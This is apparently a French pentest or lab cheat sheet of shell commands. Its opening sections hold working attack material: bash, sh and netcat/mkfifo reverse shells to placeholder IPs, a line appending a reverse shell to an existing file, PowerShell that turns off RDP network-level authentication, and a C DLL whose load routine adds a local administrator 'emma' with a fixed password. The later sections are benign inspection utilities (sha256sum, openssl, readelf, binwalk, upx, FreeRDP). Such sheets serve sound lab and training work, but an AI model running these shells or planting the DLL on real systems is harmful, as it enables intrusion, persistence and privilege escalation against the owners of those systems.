Bash ​

Bash : établir une connexion de shell inversé vers l'adresse et le port du laboratoire.

bash
# Shell inversé Bash direct
/bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1

# Ajouter le shell inverse à un fichier existant
echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file

Supprimer les fichiers indiqués.

bash
# Méthode de transfert de flux FIFO avec Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f

# Utilisation de 'sh' pour le shell inverse
sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1

Activer RDP lorsqu’il est désactivé ​

Vérifier la configuration RDP et l’authentification NLA avec PowerShell.

powershell
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
# Si le résultat est 1, l’authentification NLA est requise ; cela n’indique pas si RDP est activé

# Ne plus exiger l’authentification NLA (cela n’active pas RDP)
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Exiger l’authentification NLA pour les connexions RDP
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)

Extrait C : exemple technique pour «Compilation croisée pour Windows» (ce n'est pas une commande de terminal).

c
#include <windows.h>  
#include <stdlib.h>  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      // Code exécuté lors du chargement de la DLL
      system("net user emma Password123! /add");
      system("net localgroup administrators emma /add");
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE; // Indicate successful execution
}

Linux : créer un groupe et un utilisateur avec les UID/GID fournis (droits sudo requis).

bash
# Créer un nouveau groupe avec un GID spécifique
sudo groupadd -g <gid> <group_name>

# Créer un nouvel utilisateur avec un UID spécifique et GID
sudo useradd -u <uid> -g <gid> <username>

# Définir un mot de passe pour le nouvel utilisateur
sudo passwd <username>
bash
# Linux
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"

# Windows
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

Vérifier une empreinte de fichier ​

Calculer un condensat SHA-256 pour contrôler l'intégrité avant la manipulation d'un outil récupéré.

Vérifier une empreinte de fichier.

bash
sha256sum <FICHIER>

Afficher le certificat TLS ​

Extraire les informations de certificat d'un fichier PEM pour examiner son émetteur et sa validité.

Afficher le certificat TLS.

bash
openssl x509 -in <CERTIFICAT>.pem -noout -subject -issuer -dates

Déterminer les dépendances ELF ​

Afficher les bibliothèques déclarées dans un binaire Linux sans lancer celui-ci.

Déterminer les dépendances ELF.

bash
readelf -d <BINAIRE_ELF> | grep NEEDED

Ces outils complètent les commandes de base et facilitent l'inventaire, l'inspection de fichiers ainsi que l'accès graphique autorisé.

Identifier le format d'un fichier ​

Afficher le type détecté à partir du contenu plutôt que se fier à l'extension.

Identifier le format d'un fichier.

bash
file <CHEMIN_DU_FICHIER>

Rechercher les signatures embarquées ​

Afficher les composants et formats reconnaissables dans un binaire ou une archive.

Rechercher les signatures embarquées.

bash
binwalk <CHEMIN_DU_FICHIER>

Extraire les éléments reconnus ​

Demander à Binwalk d'extraire les éléments connus ; vérifier les fichiers produits avant leur ouverture.

Extraire les éléments reconnus.

bash
binwalk -e <CHEMIN_DU_FICHIER>

RDP : client FreeRDP 3 ​

Ouvrir une session RDP avec résolution dynamique et compte explicitement autorisé ; les options diffèrent de celles de FreeRDP 2.

RDP : client FreeRDP 3.

bash
xfreerdp3 /v:<IP_CIBLE> /u:<UTILISATEUR> /dynamic-resolution

Référence complémentaire : Notes de krovs. Présentation rédigée pour SKILL-ISSUE.

UPX : examiner un exécutable compacté ​

Les options -l et -t affichent l'information de compression et testent l'intégrité du fichier. Elles ne prouvent pas qu'un fichier est sûr. Documentation UPX.

UPX : examiner un exécutable compacté.

bash
upx -l <BINAIRE_COMPRESSE>
upx -t <BINAIRE_COMPRESSE>
